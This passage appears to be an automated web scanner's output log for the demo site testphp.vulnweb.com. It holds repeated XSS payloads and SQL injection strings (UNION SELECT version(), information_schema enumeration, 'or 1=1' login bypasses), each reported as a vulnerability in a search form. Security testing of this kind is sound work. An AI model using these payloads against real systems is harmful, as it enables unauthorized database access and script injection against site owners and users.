+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
